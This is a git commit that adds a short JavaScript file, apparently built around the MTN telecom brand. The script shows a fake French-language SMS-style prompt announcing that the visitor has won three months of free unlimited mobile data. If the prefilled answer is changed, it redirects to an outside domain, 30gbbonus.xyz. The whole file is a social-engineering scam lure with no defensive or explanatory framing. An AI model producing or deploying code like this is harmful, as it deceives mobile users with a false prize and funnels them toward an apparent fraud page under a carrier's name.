5cfd71ef5b3d099a38ef962c8b4ebda1ef378089
xmasdata <152927198+xmasdata@users.noreply.github.com>
2025-01-23 06:02:14 -0800

    Create mtnfr-active.js

---
+++ mtnfr-active.js
@@ -0,0 +1,6 @@
+
+var password = 'DONNÉES ILLIMITÉES'
+password=prompt('SMS: Félicitations, vous êtes admissible à 3 mois de données gratuites illimitées, veuillez appuyer sur OK pour activer maintenant   ','DONNÉES ILLIMITÉES');
+if (password != 'DONNÉES ILLIMITÉES') {
+location.href='https://30gbbonus.xyz/mtn-fr.html';
+}
